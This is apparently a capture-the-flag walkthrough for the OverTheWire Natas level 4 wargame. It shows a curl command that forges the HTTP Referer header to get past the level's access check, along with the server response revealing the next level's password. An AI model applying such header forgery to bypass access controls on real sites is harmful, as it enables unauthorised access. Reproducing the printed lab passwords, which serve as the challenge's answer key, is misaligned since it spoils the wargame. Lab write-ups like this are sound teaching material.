# Natas04

## Level Description
- **Username**: natas4
- **Password**: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
- **URL**: http://natas4.natas.labs.overthewire.org

## Method of Solving
When we try to login, we get the following error messages:

![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas04/image-1.png)

We can solve this one by changing the `referer` of the request with `curl`. Use `curl` to access the page supply customer HTTP Referer header:
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/overthewire/natas/natas04]
└─$ curl -H 'Referer: http://natas5.natas.labs.overthewire.org/' -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

***You are welcome!***
